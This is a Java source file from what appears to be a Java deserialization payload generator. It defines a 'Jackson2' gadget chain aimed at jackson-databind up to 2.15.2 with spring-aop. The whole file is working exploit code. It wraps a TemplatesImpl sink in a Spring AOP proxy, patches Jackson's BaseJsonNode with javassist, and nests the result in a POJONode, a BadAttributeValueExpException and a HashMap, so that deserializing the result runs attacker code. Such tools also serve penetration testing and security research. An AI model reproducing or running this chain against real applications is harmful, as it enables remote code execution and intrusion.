package com.ppp.chain.json;

import com.fasterxml.jackson.databind.node.POJONode;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;

/**
 * @author Whoopsunix
 * 处理不稳定性
 * Ref: https://xz.aliyun.com/t/12846
 */
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:<=2.15.2", "org.springframework:spring-aop:x"})
@Authors({Authors.COKEBEER})
@Sink({Sink.TemplatesImpl})
public class Jackson2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Jackson2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object o = WrapSerialization.scheduler(sinkObject, sinksHelper);
            sinkObject = (o != null) ? o : sinkObject;
        }

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        POJONode node = new POJONode(proxy);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", node);

        HashMap hashMap = new HashMap();
        hashMap.put(templates, badAttributeValueExpException);

        return hashMap;
    }
}
